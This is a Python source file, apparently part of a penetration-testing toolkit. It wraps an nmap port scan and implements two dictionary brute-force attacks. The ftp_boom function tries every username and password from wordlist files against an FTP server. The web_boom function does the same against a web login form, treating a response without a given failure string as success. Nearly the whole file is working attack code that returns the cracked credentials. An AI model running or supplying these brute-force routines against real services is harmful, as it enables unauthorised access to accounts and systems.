import nmap
import ftplib
import requests
import ast
import json
from . import xml_data


def ResultToJson(result):
    return json.dumps(result, sort_keys=True, indent=4, separators=(',',':'), ensure_ascii=False)


def nmap_tcp(target_ip):
    target = target_ip
    nm = nmap.PortScanner()
    nm.scan(target)
    return nm[target]


def get_by_line(filename):
    fp = open(filename, 'r')
    info = []
    if fp == 0:
        print('open ' + filename + ' error!')
        return
    while 1:
        line = fp.readline()
        if not line:
            break
        info.append(line.strip('\n'))
    return info


def ftp_login(ftpserver, ftpserver_port, username, passwords):
    try:
        f = ftplib.FTP(ftpserver)
        f.connect(ftpserver, ftpserver_port, timeout=10)
        f.login(username, passwords)
        # f.retrlines('LIST')
        f.quit()
        # print('The username is %s and password is %s' % (username, passwords))
        return True
    except ftplib.all_errors:
        return False


def ftp_boom(target_ip, target_port):
    FTPServer = target_ip
    FTPServer_port =  int(target_port)
    UserDict = 'login/dic/name.txt'
    PasswordDic = 'login/dic/pass.txt'
    usernames = get_by_line(UserDict)
    passwords = get_by_line(PasswordDic)
    for username in usernames:
        for password in passwords:
            if ftp_login(FTPServer, FTPServer_port, username, password):
                result = 'username:' + username + '\tpassword:' + password
                return result
    return 'username or password is not find'


def make_from(from_data):
    temp_data = {}
    temp_name = ''
    temp_passwd = ''
    temp1 = from_data.split('&')
    for i in range(len(temp1)):
        temp2 = temp1[i].split('=')
        temp_data[temp2[0]] = temp2[1]
        if i == 0:
            temp_name = temp2[0]
        elif i == 1:
            temp_passwd = temp2[0]
    return temp_data, temp_name, temp_passwd


def web_boom(target_url, data_str, fail_identification):

    data, username_key, password_key = make_from(data_str)

    # 密码本中的获取账户和密码
    UserDict = 'login/dic/name.txt'
    PasswordDic = 'login/dic/pass.txt'
    usernames = get_by_line(UserDict)
    passwords = get_by_line(PasswordDic)

    for username_value in usernames:
        for password_value in passwords:

            data[username_key] = username_value
            data[password_key] = password_value
            resp = requests.post(target_url, data=data)
            # print(data)
            if fail_identification not in resp.text:
                return str(data)

    return  'username or password is not find'
